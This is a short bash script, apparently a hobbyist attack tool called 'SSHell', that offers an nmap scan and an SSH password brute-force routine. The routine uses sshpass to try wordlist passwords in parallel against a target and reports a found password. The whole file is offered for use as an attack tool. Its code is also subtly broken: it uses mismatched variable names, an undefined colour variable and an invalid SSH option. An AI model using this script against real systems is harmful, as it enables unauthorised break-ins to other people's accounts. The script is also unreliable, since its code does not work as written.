red="\033[35;1m"
figlet SSHell
echo -e $yel"By 0Day-At0mik"

echo -e $yel"1-Scan"
echo -e $yel"2-Brute Force SSH"

read -p " (>Attacks<) " attacks 
if [ $attacks = "1" ] 
then
read -p " (>Target<) " target1
nmap $target1 
fi

if [ $attacks = "2" ] 
then
read -p " [>SSH-Target<] " SSH 
read -p " [>Wordlist<] " word 

count=0; while [ true ]; do start=$((1+$count)) end=$((5+$count)); for pass in $(sed -n ''$start','$end'p'$wordlist); do {(sshpass -p $pass ssh -o StrictHostKey=no $target1 -p 2022 "whoami" && echo Found! pass: $pass && kill -2 $$;)} & done ;wait $!; let count+=5;done 
fi
